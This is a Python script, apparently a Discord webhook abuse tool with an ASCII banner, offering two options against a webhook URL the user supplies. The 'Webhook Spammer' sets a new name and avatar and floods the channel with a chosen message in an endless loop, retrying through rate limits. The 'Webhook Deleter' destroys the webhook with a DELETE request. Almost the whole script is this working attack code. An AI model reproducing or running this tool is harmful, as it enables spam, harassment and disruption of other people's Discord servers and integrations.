from colorama import init, Fore, Style
import os
import requests
import time

os.system('cls' if os.name == 'nt' else 'clear')
init(autoreset=True)   

art = """       
 ___       __   _______   ________  ___  ___  ________  ________  ___  __                   ___  ___  _________  ___  ___       ________      
|\\  \\     |\\  \\|\\  ___ \\ |\\   __  \\|\\  \\|\\  \\|\\   __  \\|\\   __  \\|\\  \\|\\  \\                |\\  \\|\\  \\|\\___   ___\\\\  \\|\\  \\     |\\   ____\\     
\\ \\  \\    \\ \\  \\ \\   __/|\\ \\  \\|\\ /\\ \\  \\\\\\  \\ \\  \\|\\  \\ \\  \\|\\  \\ \\  \\/  /|_  ____________\\ \\  \\\\\\  \\|___ \\  \\_\\ \\  \\ \\  \\    \\ \\  \\___|_    
 \\ \\  \\  __\\ \\  \\ \\  \\_|/_\\ \\   __  \\ \\   __  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\   ___  \\|\\____________\\ \\  \\\\\\  \\   \\ \\  \\ \\ \\  \\ \\  \\    \\ \\_____  \\   
  \\ \\  \\|\\__\\_\\  \\ \\  \\_|\\ \\ \\  \\|\\  \\ \\  \\ \\  \\ \\  \\\\\\  \\ \\  \\\\\\  \\ \\  \\\\ \\  \\|____________|\\ \\  \\\\\\  \\   \\ \\  \\ \\ \\  \\ \\  \\____\\|____|\\  \\  
   \\ \\____________\\ \\_______\\ \\_______\\ \\__\\ \\__\\ \\_______\\ \\_______\\ \\__\\\\ \\__\\              \\ \\_______\\   \\ \\__\\ \\ \\__\\ \\_______\\____\\_\\  \\ 
    \\|____________|\\|_______|\\|_______|\\|__|\\|__|\\|_______|\\|_______|\\|__| \\|__|               \\|_______|    \\|__|  \\|__|\\|_______|\\_________\\
                                                                                                                                  \\|_________|
                                                                                                                                              
                                                                                                                                              
"""

motd = """
                                                                -> [1] Webhook Spammer
                                                                -> [2] Webhook Deleter
"""

print(Fore.CYAN + art + Fore.GREEN  + motd + Fore.WHITE)
option = input('--> Choose an option: ')
pfp = 'https://superiorcommunist.party/yes.jpg'
webhookURL = input('--> Enter webhook url: ')

if option == '1': 
        if not 'discord' in webhookURL:
                print(Fore.RED + '[!] Invalid webhook url!')
                exit()

        if not webhookURL.startswith(("http://", "https://")):
                webhookURL = "https://" + webhookURL

        r = requests.get(webhookURL)
       
        if r.status_code == 404:
                print(Fore.RED + '[!] Webhook does not exist!')
                exit()

        json = r.json()

        name = input('--> Enter new webhook name (Current one is ' + json['name'] + '): ')
        message = input('--> Enter message to spam: ')

        print(Fore.GREEN + '[!] Flooding webhook, become sit back and relax yourself')
        while True:
                time.sleep(0.5)
                n = requests.post(webhookURL, data={'username': name, 'avatar_url': pfp, 'content':  message, 'embeds': {}, 'components': {}, 'attachments': {} })

                if n.status_code == 200 or n.status_code == 204:
                        print(Fore.GREEN + '[!] Sent message!')
                
                if n.status_code == 429:
                        print(Fore.RED + '[!] Webhook ratelimited! Waiting 1 second')
                        time.sleep(0.5)

if option == '2':
        if not 'discord' in webhookURL:
                print(Fore.RED + '[!] Invalid webhook url!')
                exit()

        if not webhookURL.startswith(("http://", "https://")):
                webhookURL = "https://" + webhookURL

        r = requests.get(webhookURL)
       
        if r.status_code == 404:
                print(Fore.RED + '[!] Webhook does not exist!')
                exit()

        requests.delete(webhookURL)
        print(Fore.GREEN + '[!] Deleted webhook!')